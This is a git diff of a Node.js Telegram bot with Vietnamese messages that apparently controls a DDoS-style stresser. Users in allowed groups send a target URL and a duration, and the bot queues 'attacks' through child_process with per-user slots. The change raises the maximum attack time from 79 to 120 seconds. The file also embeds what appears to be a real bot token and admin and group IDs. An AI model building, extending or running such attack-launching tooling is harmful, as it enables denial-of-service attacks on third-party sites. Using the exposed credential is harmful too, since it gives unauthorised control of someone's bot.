@@ -1,11 +1,11 @@
-const TelegramBot = require('node-telegram-bot-api'), { exec } = require('child_process'), token = '7831523452:AAH-VqWdnwRmiIaidC3U5AYdqdg04WaCzvE', adminId = 7371969470, allowedGroupIds = new Set([-1002434530321, -1002334544605, -1002365124072, 556677889, 998877665]), bot = new TelegramBot(token, { polling: true }), maxSlot = 1, maxCurrent = 3, maxTimeAttacks = 79;
+const TelegramBot = require('node-telegram-bot-api'), { exec } = require('child_process'), token = '7831523452:AAH-VqWdnwRmiIaidC3U5AYdqdg04WaCzvE', adminId = 7371969470, allowedGroupIds = new Set([-1002434530321, -1002334544605, -1002365124072, 556677889, 998877665]), bot = new TelegramBot(token, { polling: true }), maxSlot = 1, maxCurrent = 3, maxTimeAttacks = 120;
 let currentProcesses = 0, queue = [], userProcesses = {}, activeAttacks = {}, isBotJustStarted = true;
 
 const restartBot = () => { console.error('🚨 Restarting bot...'); bot.stopPolling(); setTimeout(() => { bot = new TelegramBot(token, { polling: true }); initBot(); }, 1000); };
 
 const initBot = () => {
     bot.sendMessage(adminId, '[🤖Version PRO🤖] BOT Đang Chờ Lệnh.');
-    const helpMessage = `📜 Hướng dẫn sử dụng:\n➔ Lệnh chính xác: <code>https://example.com 79</code>\n⚠️ Lưu ý: Thời gian tối đa là ${maxTimeAttacks} giây.`;
+    const helpMessage = `📜 Hướng dẫn sử dụng:\n➔ Lệnh chính xác: <code>https://example.com 120</code>\n⚠️ Lưu ý: Thời gian tối đa là ${maxTimeAttacks} giây.`;
 
     bot.on('message', async msg => {
         const { chat: { id: chatId }, text, from: { id: userId, username, first_name } } = msg, isAdmin = chatId === adminId, isGroup = allowedGroupIds.has(chatId), caller = username || first_name;
@@ -22,7 +22,7 @@ const initBot = () => {
 
         if (text.startsWith('http')) {
             const [host, time] = text.split(' ');
-            if (!host || isNaN(time)) return bot.sendMessage(chatId, '🚫 Sai định dạng! Nhập theo: <code>https://example.com 79</code>.', { parse_mode: 'HTML' });
+            if (!host || isNaN(time)) return bot.sendMessage(chatId, '🚫 Sai định dạng! Nhập theo: <code>https://example.com 120</code>.', { parse_mode: 'HTML' });
             const attackTime = Math.min(parseInt(time, 10), maxTimeAttacks);
             if (userProcesses[userId] >= maxSlot) {
                 const remaining = Math.ceil((Object.values(activeAttacks).find(a => a.userId === userId)?.endTime - Date.now()) / 1000);
